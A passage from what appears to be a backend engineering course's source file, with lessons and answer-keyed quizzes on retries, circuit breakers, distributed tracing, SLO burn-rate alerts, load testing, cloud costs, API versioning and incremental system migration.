            'Delete every audit row that mentions user 4471 by id',
            'Encrypt the audit table and give the user the only key',
            'Overwrite the identifying columns on the users row, keep the id',
            'Export those rows to cold storage and drop the live table',
          ], 2, 'Erasing the personal data in the one table that holds it leaves the events intact but no longer traceable to a named person, which is what the right to erasure actually requires.'),
          q('A soft deleted user with deletedAt set tries to sign up again with the same email, and the insert fails. Why?', [
            'The application still treats the old account as active',
            'The unique index still counts the soft deleted row',
            'The email column was overwritten during the erasure',
            'Foreign keys from audit_events block the new row',
          ], 1, 'A soft deleted row is still a row, so a plain unique index keeps reserving its email until the constraint is narrowed to live rows with a partial index.'),
        ]
      ),
      ],
      [
      q('A top up writes the credit ledger row and the idempotency key row in two separate transactions, and the process dies between them. What follows?', [
        'The charge rolls back, so the retry succeeds cleanly',
        'The key blocks the retry, so the user is never charged',
        'Both writes are lost, since neither one ever committed',
        'The retry finds no key and charges the user a second time',
      ], 3, 'The ledger row committed on its own, so nothing records that the work was done and the retry repeats it, which is why both rows belong in one transaction.'),
      q('Which pairing of problem and defence is correct?', [
        'Two tabs saving one description: a version column and a 409',
        'A retried POST creating duplicates: a stricter isolation level',
        'A half applied write after a crash: an ETag on the response',
        'A lost decrement on a counter: a longer request timeout',
      ], 0, 'A version column detects that the row changed since it was read, which is exactly the lost update two concurrent editors would otherwise cause.'),
      q('Which of these writes is safe to repeat and needs no idempotency key at all?', [
        'POST /credits/topup with a body of 40 credits',
        'UPDATE lesson_progress SET completedAt = \'2026-03-04T10:00Z\'',
        'INSERT INTO audit_events describing one cancellation',
        'UPDATE wallets SET credits = credits - 1 WHERE userId = 7',
      ], 1, 'Setting a column to an absolute value leaves the same end state however many times it runs, while a delta or an insert compounds with every repeat.'),
      q('Support asks who cancelled enrolment 9182 and from where. Your audit row carries only action, subject and createdAt. What was missing?', [
        'A trigger on enrolments rather than application level logging',
        'A before column holding the previous state of the row',
        'actorId and actorType, plus the requestId carried from the edge',
        'A retention policy that keeps the row for a full seven years',
      ], 2, 'An audit row answers questions only when it names the actor and links to the request, since the action and timestamp alone cannot say who was responsible.'),
      ]
    ),
    chapter(
      'Reliability, Telemetry, and Cost',
      'Containing failures you did not cause, seeing inside a running system, and knowing what every request costs to serve.',
      [
      lesson('Timeouts, Retries, and Circuit Breakers', 13, `
Your checkout endpoint calls a payment provider that normally answers in 800ms. One Tuesday the provider does not go down, it goes slow: 30 seconds per call. Ninety seconds later your API is returning 503 to everyone, including people browsing the free catalogue who never touch payments. Your code did not change. Every worker is parked on a socket that is in no hurry.

Slow dependencies take systems down more often than dead ones do. A dead dependency fails immediately and you handle the error. A slow one holds your resources hostage while looking perfectly healthy on its own dashboard.

### Every outbound call needs a deadline

Node's global \`fetch\` has no default timeout. It waits as long as the other side keeps the socket open.

\`\`\`js
// Broken: nothing bounds how long this handler occupies a worker
const res = await fetch('https://api.payments.example/charges', {
  method: 'POST',
  body: JSON.stringify(charge),
});

// Fixed: abort at two seconds and handle the failure yourself
const res = await fetch('https://api.payments.example/charges', {
  method: 'POST',
  body: JSON.stringify(charge),
  signal: AbortSignal.timeout(2000),
});
\`\`\`

Choose that number from the dependency's measured p99, not from optimism. If the provider's p99 is 1.4s, a 2s timeout trims the tail without killing healthy calls. A 30s timeout is not a timeout, it is a wish.

Then spend a budget downstream. If the browser gives up at 5s, the handler gets 4s, the payment call gets 2s, and the two queries around it get 200ms each. Pass the remaining time down so a call with 300ms left never starts a 2s attempt it cannot finish.

### Retry the retryable, and nothing else

\`\`\`js
// Broken: hammers a struggling service and repeats a request that can never succeed
for (let i = 0; i < 5; i++) {
  try { return await charge(order); } catch {}
}
\`\`\`

A 400 means the request itself is wrong. Retrying it produces the same 400 five times, four times slower. Retry network errors, 429, and 502/503/504. Never retry 400, 401, 403, 404, 409, or 422.

\`\`\`js
const RETRYABLE = new Set([429, 502, 503, 504]);

async function withRetry(call, attempts = 3) {
  for (let i = 0; i < attempts; i++) {
    try {
      return await call();
    } catch (err) {
      if (i === attempts - 1) throw err;
      if (err.status && !RETRYABLE.has(err.status)) throw err;
      const ceiling = 200 * 2 ** i;            // 200ms, 400ms, 800ms
      await sleep(Math.random() * ceiling);    // full jitter
    }
  }
}
\`\`\`

Jitter is the line people delete because it looks decorative. It is not. When 900 requests fail in the same second and every client backs off by exactly 400ms, the recovering service is hit by 900 requests in the same millisecond and falls over again. Randomising inside the window spreads them out.

Watch the multiplication too. Three attempts in the browser, wrapping three in the API, wrapping three in the worker, is 27 requests for one user action. Retries stack across layers, so retry in exactly one place, usually the layer closest to the dependency.

### A breaker stops you queueing for a corpse

When a dependency is failing 80% of calls, the next call is unlikely to be the lucky one. A circuit breaker counts outcomes and changes behaviour.

| State | Behaviour | Leaves when |
|---|---|---|
| Closed | Calls pass through, failures counted | Failure ratio crosses the threshold |
| Open | Calls fail instantly, no socket opened | The cool off timer expires |
| Half open | A few probe calls allowed through | Probes succeed (closed) or fail (open) |

Failing in 1ms instead of 2000ms is the entire point. Your workers stay free, the catalogue keeps serving, and the struggling provider gets a chance to recover instead of a constant flood.

Then decide what an open breaker returns. A cached price, a queued job with \`202 Accepted\`, or a \`503\` carrying \`Retry-After: 30\` all beat a thirty second hang followed by an error.

One trap survives all of this: a POST that timed out may have succeeded, with only the response lost. Retrying it charges the card twice unless the request carries an idempotency key, which is why writes need one and reads do not.
      `,
        [
          q('A payment provider slows from 800ms to 30s. Catalogue endpoints that never call it start returning 503. Why?', [
            'The provider 503s are cached and served on the other routes',
            'Node retries the aborted socket automatically on every route',
            'Handlers waiting on the slow call hold every worker, so nothing else is served',
            'The event loop is blocked while it awaits the outbound fetch',
          ], 2, 'A slow dependency occupies handlers and connections until it answers, so requests to unrelated routes queue behind them and time out.'),
          q('Why add random jitter to the wait between retry attempts?', [
            'It spreads clients out so they do not all retry in the same millisecond',
            'It keeps the total retry time inside the request budget',
            'It makes each attempt more likely to reach a different instance',
            'It stops the same request being delivered to the server twice',
          ], 0, 'Fixed backoff synchronises every client that failed at the same moment, so a recovering service is hit by one wall of traffic after another.'),
          q('The circuit breaker guarding the payment API is in the open state. What happens to the next call?', [
            'It waits for the cool off timer to expire, then it is sent',
            'It is queued and delivered once the breaker closes again',
            'It is sent as usual, but with a much shorter timeout',
            'It fails instantly, without a socket to the provider being opened',
          ], 3, 'An open breaker fails fast so your workers stay free and the struggling dependency stops receiving traffic it cannot serve.'),
        ]
      ),
      lesson('Tracing a Request Across Every Hop', 13, `
Checkout p95 is 4.2 seconds. The API team's dashboard says their p95 is 320ms. Payments says 210ms. The database says 40ms. Every one of those numbers is correct, and the user is still waiting four seconds.

The time is not inside any service. It is between them: in a connection pool queue, in a retry sleep, in a worker that picked the job up three seconds after it was enqueued. No single service's metrics can show you that, because no single service was slow.

### A trace is a tree of spans

A span is one timed operation: a name, a start time, a duration, a parent, and some attributes. A trace is every span that shares one trace id.

\`\`\`json
{
  "traceId": "4bf92f3577b34da6a3ce929d0e0e4736",
  "spanId": "00f067aa0ba902b7",
  "parentSpanId": "a1b2c3d4e5f60718",
  "name": "POST /api/enrolments",
  "startTime": "2026-03-04T09:12:44.118Z",
  "durationMs": 4192,
  "attributes": { "http.status_code": 201, "user.id": "u_8842", "db.rows": 3 }
}
\`\`\`

Laid out as a waterfall, that enrolment stops being a mystery:

| Span | Starts at | Duration |
|---|---|---|
| POST /api/enrolments | 0ms | 4192ms |
| .. check seat availability | 4ms | 38ms |
| .. insert enrolment row | 44ms | 22ms |
| .. call payment.charge | 70ms | 4090ms |
| .... wait for a free connection | 70ms | 3880ms |
| .... HTTP POST /charges | 3950ms | 210ms |

Payments really did answer in 210ms. Your process spent 3.9 seconds waiting for a free HTTP connection, because the agent pool was sized at 10 and the timeouts from the previous topic were missing, so every stuck call held its slot.

### Propagation is the whole trick

Context travels in one header, standardised as W3C Trace Context:

\`\`\`http
traceparent: 00-4bf92f3577b34da6a3ce929d0e0e4736-00f067aa0ba902b7-01
\`\`\`

Four fields: version \`00\`, the 32 hex trace id, the caller's span id which becomes your parent, and flags, where \`01\` means sampled. Read it on the way in, write it on the way out.

\`\`\`js
app.use((req, res, next) => {
  const span = tracer.startSpan(\`\${req.method} \${req.route?.path ?? req.path}\`, {
    parent: parseTraceparent(req.get('traceparent')),
  });
  store.run({ span }, next);        // AsyncLocalStorage, so nested code finds it
});

// Every outbound call re-emits it
await fetch(url, { headers: { traceparent: format(store.get().span) } });
\`\`\`

Miss one hop and the trace splits into two orphans nobody can rejoin. Queues are where this happens most: the HTTP request enqueues a job, the worker begins a fresh trace, and the three second queue wait becomes invisible to both. Put the traceparent in the job payload and restore it in the worker.

### Sample at the edge, or not at all

Storing every span for 40 million requests a month is expensive and mostly useless, because the 39.99 million healthy ones look identical. Sample 1% at the front door and propagate that decision in the flags bit so every service in the request agrees.

Letting each service decide independently is the classic mistake. With five services each rolling their own dice at 10%, a complete trace turns up once in ten thousand requests, and your storage fills with fragments that explain nothing.

Tail sampling flips the order: buffer the whole trace, then keep it only if a span errored or the total crossed one second. You pay for the buffer and get the traces you actually wanted.

### Attributes are cheap, labels are not

\`user.id\` on a span is fine, it is one field on one record. The same value as a Prometheus metric label creates one time series per user. At 400,000 users that is 400,000 series for a single counter, and your metrics bill quietly passes your compute bill.

Keep metric labels to bounded sets: route, method, status class. Put the unbounded facts on spans and log lines, and carry the trace id into every one of them so a single id joins logs, metrics, and traces into one story.
      `,
        [
          q('An HTTP handler enqueues a job and the worker starts its own trace. What does that cost you?', [
            'The worker spans, because they have no parent span to attach to',
            'The queue wait, since nothing measures the gap between two traces',
            'The trace id on the worker log lines, which cannot be generated',
            'The sampling decision, which resets to zero for the whole request',
          ], 1, 'Without the traceparent travelling in the job payload the request and the job are two unrelated traces, so time spent queued is measured by nobody.'),
          q('Five services each sample traces independently at 10%. What is the result?', [
            'Ten percent of traces are stored, and each one is complete',
            'Traces stay complete but reach the backend badly out of order',
            'The decision made by the first service wins, so nothing changes',
            'Almost every stored trace is a fragment missing most of its hops',
          ], 3, 'The sampling decision has to be taken once at the edge and propagated in the traceparent flags, otherwise the odds of five services agreeing are tiny.'),
          q('Why is a user id acceptable as a span attribute but dangerous as a metric label?', [
            'Every distinct label value creates its own time series, so the count explodes',
            'Metric labels are retained forever while spans expire after a week',
            'Span attributes are encrypted at rest and metric labels are not',
            'Metrics are sampled at 1%, so most of the user ids would be lost',
          ], 0, 'A span attribute is one field on one record, while a metric label multiplies the stored series by every distinct value it ever takes.'),
        ]
      ),
      lesson('Service Levels, Error Budgets, and Alerts Worth Waking For', 13, `
99.9% uptime sounds like a promise. Written as a number it is 43 minutes and 12 seconds of failure per month, and you get all of it. 99.99% is 4 minutes 19 seconds, which no human can respond to, so it has to be automatic. Pick the wrong target and you either wake people for nothing or promise something the architecture cannot deliver.

| Target | Failure per 30 days | What it demands |
|---|---|---|
| 99% | 7h 12m | One instance, business hours care |
| 99.9% | 43m 12s | Redundancy, fast rollback, on call |
| 99.99% | 4m 19s | Multi zone, automated failover |
| 99.999% | 26s | A dedicated team, and a very good reason |

### Measure what the user feels

An SLI is a ratio: good events over valid events. Measure it where the user is, at the load balancer or in the browser, not inside the service, because a service that has stopped answering reports nothing at all and looks flawless.

\`\`\`text
availability = requests answered with status < 500 / all requests
latency      = requests answered in under 400ms   / all requests
\`\`\`

Latency as a ratio, never as an average. A mean of 180ms is perfectly compatible with 5% of users waiting six seconds, and those 5% are the ones who leave.

An SLO is that ratio plus a target and a window: 99.9% of \`POST /api/enrolments\` requests succeed, measured over a rolling 28 days.

### The error budget turns reliability into a decision

At a 99.9% target over 43 million requests, the budget is 43,000 failed requests. That is not a shameful number, it is a currency. Spend it on releases, on a risky migration, on a database upgrade during a quiet Sunday. When it runs out, the team stops shipping features and works on reliability until the window rolls forward.

That single rule kills both failure modes of every reliability argument: shipping recklessly because nobody was counting, and freezing everything because one incident frightened the room.

### Alert on the burn rate, not on a symptom of a symptom

\`\`\`yaml
# Broken: fires at 02:00 nightly during the backup, and nobody has ever acted on it
- alert: HighCPU
  expr: avg(cpu_usage) > 0.8
  for: 5m
\`\`\`

CPU at 90% while every request is served in 120ms is a machine doing its job well. The alert worth having says the budget is disappearing faster than the window can afford.

Burn rate is how fast you are spending it. A rate of 1x consumes the whole budget exactly at the end of the window. A rate of 14.4x consumes it in two days.

| Burn rate | Window | Budget spent | Action |
|---|---|---|---|
| 14.4x | 1 hour | 2% | Page a human now |
| 6x | 6 hours | 5% | Page a human |
| 3x | 1 day | 10% | Ticket, handle today |
| 1x | 3 days | 10% | Ticket, this sprint |

Require a short window and a long window to be burning together. The short one catches a sharp outage within minutes. The long one stops a 90 second blip from waking anybody, because a blip that never threatened the month is not an emergency.

### Three questions before anything is allowed to page

1. Would a user notice this right now? If not, it is a ticket.
2. Is there something a person can do about it at 03:00? If not, it is a ticket.
3. Has this alert ever led to an action? If it has not fired usefully in six months, delete it.

A rotation that gets four pages a night stops reading them by the second week, and the one real page arrives into that silence. Every alert you delete makes the surviving ones louder.
      `,
        [
          q('A 99.9% monthly availability SLO is agreed. How much failure does that allow?', [
            'About 43 seconds, so any failover has to be automatic',
            'About 7 hours, which one on call engineer can cover',
            'About 4 minutes, which rules out a manual response',
            'About 43 minutes, which the team may spend deliberately',
          ], 3, 'One tenth of one percent of 30 days is 43 minutes and 12 seconds, and that allowance is the error budget a team spends on releases and risk.'),
          q('Why is a mean response time a poor latency SLI?', [
            'Means are expensive to compute over a rolling window',
            'A healthy mean hides a slow tail that real users sit in',
            'Means cannot be compared across two different endpoints',
            'A mean counts every failed request as though it were fast',
          ], 1, 'An average of 180ms is compatible with 5% of requests taking six seconds, so the SLI should count requests served under a threshold instead.'),
          q('Why require a short burn rate window and a long one before paging?', [
            'The long window sees error types that the short window cannot',
            'Two windows halve the number of queries the alert has to run',
            'The short one reacts fast, the long one filters out brief blips',
            'The short one covers deploys and the long one covers traffic peaks',
          ], 2, 'Requiring both windows to be burning means a sharp outage pages within minutes while a 90 second blip that never threatened the month does not.'),
        ]
      ),
      lesson('Load Testing, Capacity, and the Bill', 13, `
Staging handled 200 requests per second across four instances with a green dashboard. On launch day production folded at 90. The load test was the lie: 50 virtual users, each sending its next request only after the previous one came back. When the server slowed to 500ms, those 50 users politely slowed down with it. Real users do not.

### A closed loop test hides the failure you are testing for

In a closed model the offered load falls as latency rises, so the system throttles the test instead of the test stressing the system. This is coordinated omission: the requests you never sent during the slow patch are missing from your percentiles, and the report comes back calm.

Model arrivals instead. Users arrive at a rate that has nothing to do with how well you are coping.

\`\`\`js
// k6: open model, 300 arrivals per second regardless of how slow we get
import http from 'k6/http';

export const options = {
  scenarios: {
    launch: {
      executor: 'constant-arrival-rate',
      rate: 300, timeUnit: '1s', duration: '10m',
      preAllocatedVUs: 400, maxVUs: 2000,
    },
  },
  thresholds: {
    http_req_failed: ['rate<0.01'],
    http_req_duration: ['p(99)<800'],
  },
};

export default function () {
  http.get('https://staging.example.com/api/courses');
}
\`\`\`

If k6 warns that it could not reach the arrival rate, that warning is the result. It means the system is already past its knee and every extra user is joining a queue.

### Little's Law does the capacity arithmetic

Concurrency equals arrival rate multiplied by latency. At 300 requests per second and a mean of 120ms, 36 requests are in flight at any instant. Serve those through a pool of 10 database connections and 26 of them are queueing before they reach your code.

Run it backwards to size things. A query taking 20ms on one connection gives 50 queries per second per connection, so a pool of 20 caps you at 1,000 queries per second no matter how many instances you add. That is the ceiling the fourth instance will not raise.

Then leave headroom. Target half the measured knee, because when one of four instances dies the other three inherit its traffic, and a fleet running at 80% becomes a fleet at 107%.

### The bill is a design constraint

Compute is rarely the interesting line. Here is the shape of a real monthly bill for a service doing 40 million requests:

| Line item | Amount |
|---|---|
| Compute, 4 instances | $180 |
| Managed Postgres | $220 |
| Log ingest, 2KB per request, 80GB | $340 |
| Traces stored at 100% sampling | $410 |
| Cross zone data transfer | $190 |
| Egress to the internet | $95 |

Observability costs more than the application it observes. That is common, and it is the reason for the 1% sampling in the previous topic and for keeping debug logging off by default. Sampling traces at 1% and trimming log lines to the fields you actually query turns that $750 into roughly $90.

Cross zone transfer is the line that surprises everybody. Two instances chatting across availability zones are billed per gigabyte, and a chatty cache or a replica read landing in the wrong zone can cost more than the servers doing the work.

### Know your cost per request

Total the bill and divide. $1,435 over 40 million requests is 0.0036 cents each. That one number turns opinions into arithmetic: the N+1 query adding 30 round trips per page now has a price, and so does a 3MB JavaScript bundle served 40 million times.

Measure it before a launch, not after the invoice arrives. Capacity you cannot explain and cost you cannot attribute fail the same way, at the worst possible moment.
      `,
        [
          q('A load test runs 50 virtual users that each wait for a response before sending the next request. Why does it overstate capacity?', [
            'As the server slows the test sends less load, so queueing never appears',
            'Fifty users cannot open enough connections to fill the server pool',
            'Virtual users share one socket, which the server counts as one client',
            'The test measures latency at the server rather than at the client',
          ], 0, 'A closed loop lets latency throttle the offered load, so the requests that would have arrived during the slowdown are never sent and never counted.'),
          q('A service averages 120ms per request and receives 300 requests per second. How many requests are in flight on average?', [
            'About 2.5',
            'About 25',
            'About 36',
            'About 360',
          ], 2, 'Little\'s Law gives concurrency as arrival rate multiplied by latency, so 300 per second times 0.12 seconds is 36 requests in flight.'),
          q('Which line on a cloud bill most often grows larger than the application it belongs to?', [
            'Compute for the extra instances behind the load balancer',
            'Log and trace ingest at full volume with no sampling',
            'Storage for the database backups retained for 30 days',
            'Certificates issued for each customer facing subdomain',
          ], 1, 'Two kilobytes of log per request plus unsampled traces across tens of millions of requests routinely cost more than the servers producing them.'),
        ]
      ),
      ],
      [
      q('A POST to the payment API times out after two seconds and the client retries it. What is the risk?', [
        'The second attempt is rejected because the first still holds a lock',
        'The provider counts both attempts against your rate limit only',
        'The retry arrives before the timeout, so the two run concurrently',
        'The first call may have succeeded, so the card is charged twice',
      ], 3, 'A timeout tells you nothing about what the other side did, so a retried write needs an idempotency key before it is safe to send again.'),
      q('Checkout p95 is four seconds, yet every service reports a p95 under 300ms. What explains it?', [
        'The time sits between services, in queues and pool waits nobody spans',
        'The dashboards each compute the p95 over a different time window',
        'The browser is rendering slowly after the final response arrives',
        'One service is dropping requests, which are never counted as slow',
      ], 0, 'Per service metrics only cover time inside each service, so a wait in a connection pool or a queue shows up only in a trace that crosses every hop.'),
      q('The error budget for the month is exhausted on day 12. What should the team do?', [
        'Raise the SLO target so the budget covers the remaining days',
        'Pause risky changes and spend the time on reliability work',
        'Reset the budget and start the measurement window from today',
        'Page the on call engineer until the error rate comes back down',
      ], 1, 'An exhausted budget is the agreed signal to stop spending risk on features until the rolling window recovers some allowance.'),
      q('Adding a fourth instance raises throughput by nothing at all. Which explanation fits best?', [
        'The load balancer keeps sending every request to the oldest instance',
        'Each instance is running its own separate copy of the memory cache',
        'The shared database connection pool is already the real ceiling',
        'The new instance has not yet finished its rolling deploy and warmup',
      ], 2, 'Capacity is set by the slowest shared resource, so once the pool caps queries per second more application instances only add queueing.'),
      ]
    ),
    chapter(
      'Evolving a System People Depend On',
      'Changing the shape of a live application, its data, and its public contract without breaking the people who rely on it.',
      [
      lesson('Seams, Modules, and When to Split a Service', 13, `
A team split their Express app into six services over one quarter. The course page had been a single request at 180ms p95. Afterwards it fanned out across four services and p95 landed at 900ms, with a failure mode nobody had before: when the reviews service restarted, the whole page returned 500. They had not decoupled anything. They had taken function calls that could not fail and turned them into network calls that could.

Splitting is a deployment decision. The design decision underneath it, the one that actually pays, is the **seam**.

### A seam is a place you can change one side without editing the other

Organise by feature, not by layer. A folder called \`controllers/\` holding thirty unrelated files is a filing cabinet, not a boundary.

\`\`\`
server/src/
  modules/
    catalogue/     index.js  service.js  repo.js  routes.js
    enrolment/     index.js  service.js  repo.js  routes.js
    certificates/  index.js  service.js  renderer.js
  shared/
    db.js  config.js  errors.js
\`\`\`

Each module publishes exactly one file, \`index.js\`. Everything beside it is private. A module may import \`shared/*\` and another module's \`index.js\`, and nothing else. Conventions nobody checks last about six weeks, so make the linter check it:

\`\`\`js
// eslint.config.js
'no-restricted-imports': ['error', {
  patterns: [{
    group: ['**/modules/*/!(index).js'],
    message: 'Import a module through its index.js, not its internals.',
  }],
}],
\`\`\`

The test for a real seam is blunt: delete a folder and see whose tests go red. If removing \`certificates/\` breaks \`enrolment/\`'s tests, the boundary was decoration.

### Data ownership is the boundary that counts

Two modules writing the same table are one module wearing two names. If \`enrolment\` sets \`certificates.issued_at\` with its own SQL, no directory layout will save you: the certificate rules now live in two places and the next change has to find both. One module owns a table, everyone else asks it.

### When a split earns its cost

| Reason given | Does it hold up |
|---|---|
| PDF rendering pins a core and starves request handling | Yes, a different resource profile |
| Two teams block each other on every release | Yes, independent deploy cadence |
| Search needs 8GB of RAM the API does not | Yes, different machine shape |
| The codebase is getting big | No, that is a module problem |
| Microservices are current best practice | No, that is a fashion problem |

Price the other side honestly. An in-process call costs roughly 100 nanoseconds and cannot half-succeed. The same call over HTTP inside one datacentre costs one to three milliseconds, can time out, can retry, and can arrive twice. A write that spanned two tables in one transaction becomes two writes that can disagree. A stack trace becomes a distributed trace you have to build first.

### Split along a seam you already have

A module that already talks through \`index.js\` and owns its tables can be promoted to a service by swapping what sits behind the same signature:

\`\`\`js
// certificates/index.js, in process
export { issue } from './service.js';

// certificates/index.js, over the network, same signature
export async function issue(enrolmentId) {
  const res = await fetch(\`\${config.certificatesUrl}/issue\`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ enrolmentId }),
  });
  if (!res.ok) throw new UpstreamError('certificates', res.status);
  return res.json();
}
\`\`\`

Callers do not change. That is the whole payoff: the split is a one file change, and so is the revert.

Teams that split first, before the seam exists, get the distributed monolith. Six services that must be deployed together, because every feature still touches four of them, and every one of those touches is now a network hop. All of the latency, none of the independence. Build the module boundary while it is still cheap to move, and treat the network as something you add only when you can name what you are buying.
      `,
        [
          q('A course page served in 180ms as one process now takes 900ms across four services, and it fails whenever the reviews service restarts. What did the split actually change?', [
            'JSON serialisation replaced the cost of passing objects in memory',
            'The shared database became the bottleneck for all four services',
            'Calls that could not fail became network calls that add latency and fail',
            'Each service now runs its own duplicated copy of the business rules',
          ], 2, 'A function call inside one process cannot time out or return a 503, and turning it into a network hop adds both latency and a new failure mode for every caller.'),
          q('Two modules both write rows to the `certificates` table. Why does a tidy folder structure not make them separate?', [
            'Shared ownership of the table couples them, so either can break the other\'s rules',
            'Node resolves imports at runtime, so folder names have no effect at all',
            'Direct SQL bypasses index.js, which the linter has no way to detect',
            'Two writers on one table will eventually deadlock under load',
          ], 0, 'When the certificate rules exist in two modules, a change has to find both of them, which is exactly the coupling the boundary was supposed to remove.'),
          q('Which of these is the strongest signal that extracting a separate service will pay for itself?', [
            'The repository has passed 60,000 lines and feels hard to navigate',
            'The team would like each feature area to own its own repository',
            'New joiners take a long time to find where a given route is handled',
            'PDF rendering saturates a CPU core and starves request handling',
          ], 3, 'A genuinely different resource profile is something a module boundary cannot fix, so it is one of the few reasons a separate process earns its latency and failure cost.'),
        ]
      ),
      lesson('Versioning an API Other People Depend On', 13, `
You rename \`title\` to \`name\` in the course JSON. Your React app is updated in the same commit, so every test passes and staging looks perfect. Three days later support has forty tickets: a partner's learning system renders blank rows, and an iOS build from eleven months ago that 14% of your users still run shows an empty catalogue. Nothing in your repository could have caught it, because the client that broke is not in your repository.

Once someone else's code reads your response, the shape of that response is a contract you no longer own alone.

### The line between additive and breaking

| Change | Safe | Why |
|---|---|---|
| Add a field to a response | Yes | A tolerant reader ignores what it does not know |
| Add an optional request field | Yes | Old callers simply omit it |
| Rename or remove a response field | No | Readers looking for it get \`undefined\` |
| Make an optional request field required | No | Every existing caller starts failing |
| Add a value to an enum | Usually not | Strict clients reject what is not in their list |
| Tighten a max length from 500 to 200 | No | Requests valid yesterday now return 400 |
| Change default page size from 100 to 20 | No | Callers that ignore paging silently lose rows |
| Return 400 where you used to return 404 | No | Status codes are part of the contract too |

The last three catch people out, because none of them touch a field name. Anything that changes what a correct old caller receives is breaking, whether or not the schema file moved.

### Version the API, not the endpoint

\`\`\`js
app.use('/api/v1', v1Router);
app.use('/api/v2', v2Router);
\`\`\`

Per endpoint versions produce \`/courses/v3\` next to \`/enrolments/v1\`, and then nobody can say what version of your API they are running. One number for the whole surface.

Keep v2 a translation layer, never a fork:

\`\`\`js
// modules/catalogue/routes.v2.js
router.get('/courses/:slug', async (req, res) => {
  const course = await service.getCourse(req.params.slug);   // one source of truth
  res.json(toV2(course));                                    // one mapping function
});
\`\`\`

The moment v1 and v2 hold their own business rules you are maintaining two products with one team, and a bug fix has to be written twice.

Media type versioning (\`Accept: application/vnd.cortexis.v2+json\`) is arguably cleaner, and it is invisible in an access log, in a URL somebody pastes into a ticket, and in the curl command you send a partner at 2am. For a public API, path versioning wins on debuggability.

### You cannot retire a version you cannot measure

Log the version and a client identifier on every request. Retirement then becomes arithmetic rather than nerve:

\`\`\`http
Deprecation: Wed, 01 Oct 2025 00:00:00 GMT
Sunset: Sun, 01 Feb 2026 00:00:00 GMT
Link: <https://docs.example.com/api/v2>; rel="deprecation"
\`\`\`

Announce with those headers and in the docs, watch the traffic split weekly, contact the top ten callers by name, then run two scheduled brownouts (v1 returns 503 for five minutes at a published time) before the real switch off. The brownout finds the integration whose owner left the company, at a moment you have chosen.

### Fail the build, not the customer

Generate an OpenAPI document from your route schemas and diff it in CI:

\`\`\`bash
npx oasdiff breaking specs/v1.previous.yaml specs/v1.current.yaml
\`\`\`

A breaking diff fails the pipeline unless the version number moves. That turns "someone should have noticed" into a red check on a pull request.

One last trap, and it is the worst of them. Never reuse a name with a new meaning. Changing \`price\` from pence to pounds while keeping the field and its type breaks nothing loudly: every client keeps parsing a number, and every one of them is now wrong by a factor of one hundred. Removing a field gives your callers an error. Redefining one gives them plausible nonsense.
      `,
        [
          q('You reduce the maximum length of a course description from 500 characters to 200. Why does that count as a breaking change when no field was renamed?', [
            'Stored rows longer than 200 characters can no longer be read back',
            'Requests that were valid yesterday now come back as a 400 error',
            'Clients have to resend the whole payload whenever validation moves',
            'The response schema shrinks, so tolerant readers lose the field',
          ], 1, 'Breaking means a correct old caller stops working, and tightening validation rejects requests that your API accepted the day before.'),
          q('Why does path versioning such as `/api/v2` usually beat a custom `Accept` media type for a public API?', [
            'Media type negotiation is unsupported by most HTTP client libraries',
            'Path versioning lets each endpoint move to a new version on its own',
            'Proxies strip unfamiliar Accept headers, so the version is often lost',
            'The version shows up in logs, in a pasted URL and in a curl command',
          ], 3, 'Debuggability decides it: a version you can see in an access log or a support ticket saves far more time than the theoretical purity of header negotiation.'),
          q('A field named `price` changes from pence to pounds, keeping the same name and type. Why is that worse than deleting the field outright?', [
            'Nothing errors, so wrong values flow through every client unnoticed',
            'Clients cache the previous value and serve it until the cache expires',
            'Number precision changes, so totals drift through rounding over time',
            'An OpenAPI diff cannot express a unit change, so the build goes red',
          ], 0, 'A removed field produces a visible failure your callers can fix, while a redefined field keeps parsing cleanly and quietly makes every amount wrong by a factor of one hundred.'),
        ]
      ),
      lesson('Replacing a Running System Piece by Piece', 13, `
Two teams set out to replace the same certificate pipeline. One opened a branch called \`rewrite-v2\` and worked on it for fourteen months; by the end it had nine hundred commits of drift, could not be merged, and was deleted. The other put a router in front of one endpoint and moved a single call path on day four. Six months later they owned the whole pipeline and had shipped every week along the way.

The pattern is the strangler fig: the new system grows around the old one, taking one path at a time, until nothing is left inside.

### Put the facade in before you write any new code

\`\`\`js
// server/src/gateway/certificates.js
router.post('/certificates', (req, res, next) => {
  if (flags.enabled('certificates.newPipeline', req.user.id)) {
    return newPipeline.handle(req, res, next);
  }
  return legacy.handle(req, res, next);
});
\`\`\`

Both implementations live behind one URL, so clients never learn a migration is happening. The flag reads from configuration, not from a constant, because "turn it off" during an incident must not require a deploy.

### Shadow before you switch

Run the new code beside the old one and serve the old answer:

\`\`\`js
const answer = await legacy.issue(enrolmentId);

queueMicrotask(async () => {
  try {
    const candidate = await next.issue(enrolmentId, { dryRun: true });
    if (!deepEqual(normalise(candidate), normalise(answer))) {
      log.warn({ enrolmentId, diff: diff(candidate, answer) }, 'shadow mismatch');
    }
  } catch (err) {
    log.warn({ err, enrolmentId }, 'shadow threw');
  }
});

return answer;
\`\`\`

Users are unaffected. You get real production input, which is the one thing fixtures never give you. A team running this for two weeks saw a 0.28% mismatch rate, every case traced to an issue date rounded in the server's local timezone instead of UTC. That bug was fourteen days of quiet logs instead of a Monday morning incident.

Shadow reads and pure computations only. Shadowing anything with a real side effect sends the learner two emails and charges the card twice.

### Move the data in steps that can each be the last one

Expand, migrate, contract from Chapter 7 applies to ownership too, with one step teams routinely skip.

| Step | Who is authoritative | If you stop here |
|---|---|---|
| 1. New store exists, nothing written | Old | Safe, and no progress |
| 2. Dual write, still read old | Old | Safe, costs one extra write per request |
| 3. Backfill history, compare counts and checksums | Old | Safe, and this is where errors surface |
| 4. Read new, fall back to old on a miss | New | Safe, but the fallback hides gaps |
| 5. Stop writing old, keep it read only | New | Reverting now costs a backfill |
| 6. Drop the old store | New | No way back |

Step 4 is the trap. A fallback that quietly answers from the old store makes step 3's mistakes invisible, and you cut over believing the backfill was complete. Increment a counter on every fallback and alert on it. If that counter is not flat at zero for a full week, including your quiet weekend traffic, you are not ready for step 5.

### The expensive failure is the migration that parks

Bad cutovers get rolled back in ten minutes. The migration that sits at step 4 for two years is the one that costs a fortune: every new feature has to be written into both systems, every bug reproduced twice, and every new joiner taught a history lesson before they can change anything.

So give it an end date. Put the count of remaining legacy calls on the same dashboard as your error rate, watch it fall, and delete the old code the week it reaches zero. Deleting feels risky and is not: the code is in git, and restoring a file is a minute of work. Keeping a dead path alive costs you something every single sprint.
      `,
        [
          q('Shadow traffic runs the new certificate code beside the old one for two weeks while users keep getting the old answer. What does that buy that a fixture based test suite cannot?', [
